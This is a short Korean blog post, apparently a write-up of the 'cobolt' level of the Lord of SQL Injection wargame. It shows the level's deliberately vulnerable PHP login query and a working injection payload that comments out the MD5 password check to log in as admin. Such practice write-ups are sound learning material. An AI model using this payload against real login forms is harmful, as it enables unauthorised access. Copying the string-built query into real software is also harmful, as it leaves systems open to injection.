---
layout: post
title: ! "[LOS] cobolt"
categories: [LOS]
excerpt: " "
comments: true
share: true
tags:
  - LOS
  - Web-hacking
  - cobolt
  - write-up
---
![](/assets/posts/los/cobolt.png)

첫번째 문제 gremlin을 풀고 cobolt로 넘어오면 gremlin과 비슷한 쿼리문이 있다.

`query: select id from prob_cobolt where id='' and pw=md5('')`

```php
<?php

  include "./config.php"; 
  login_chk();
  dbconnect();
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[id])) exit("No Hack ~_~"); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  $query = "select id from prob_cobolt where id='{$_GET[id]}' and pw=md5('{$_GET[pw]}')"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id'] == 'admin') solve("cobolt");
  elseif($result['id']) echo "<h2>Hello {$result['id']}<br>You are not admin :(</h2>"; 
  highlight_file(__FILE__); 
?>
```

gremlin과 달라진 점이라면 id가 admin이어야 풀린다. 그리고 pw는 md5로 암호화된다.
gremlin에선 pw를 참으로 만들어줬지만, 이번엔 id가 admin이어야 하고, pw가 md5로 암호화 된다는 전제가 있으니
id는 admin으로 넣어주되, pw 부분을 주석 처리 해주는 방식으로 풀었다.

`?id=admin%27or%271=1%20--`

이런식으로 값을 넣으면 쿼리문은 다음과 같다.

![](/assets/posts/los/cobolt_clear.png)

코볼트 클리어!
